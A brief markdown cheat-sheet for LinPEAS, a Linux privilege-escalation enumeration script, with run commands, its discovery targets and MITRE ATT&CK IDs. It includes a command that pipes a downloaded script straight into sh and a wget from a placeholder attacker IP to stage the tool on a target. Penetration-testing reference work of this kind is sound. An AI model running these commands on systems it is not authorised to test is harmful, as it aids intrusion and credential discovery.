# LinPEAS

## Purpose
Linux Privilege Escalation Awesome Script — automated enumeration tool for identifying privilege escalation vectors on Linux systems.

---

## ⚡ Common Commands

```bash
# Download and run directly
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Transfer and run
wget http://<ATTACKER-IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt
```

---

## 🎯 Used For

- SUID/SGID binary discovery
- Sudo misconfiguration detection
- Cron job enumeration
- Writable file detection
- Credential file discovery

---

## 🗺️ MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Privilege Escalation | TA0004 |
| System Information Discovery | T1082 |
